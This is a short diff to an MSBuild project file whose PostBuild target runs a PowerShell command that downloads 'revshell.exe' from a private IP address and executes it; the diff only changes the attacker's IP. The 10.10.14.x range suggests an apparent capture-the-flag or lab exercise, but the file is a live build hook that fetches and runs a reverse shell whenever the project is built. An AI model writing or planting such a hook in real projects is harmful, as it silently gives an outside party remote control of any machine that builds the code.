@@ -9,7 +9,7 @@
   </PropertyGroup>
 
   <Target Name="PostBuild" AfterTargets="PostBuildEvent">
-    <Exec Command="powershell.exe -command iwr -Uri http://10.10.14.43:81/revshell.exe -OutFile C:/Users/Public/revshell.exe; C:/Users/Public/revshell.exe" />
+    <Exec Command="powershell.exe -command iwr -Uri http://10.10.14.52/revshell.exe -OutFile C:/Users/Public/revshell.exe; C:/Users/Public/revshell.exe" />
   </Target>
 
 </Project>
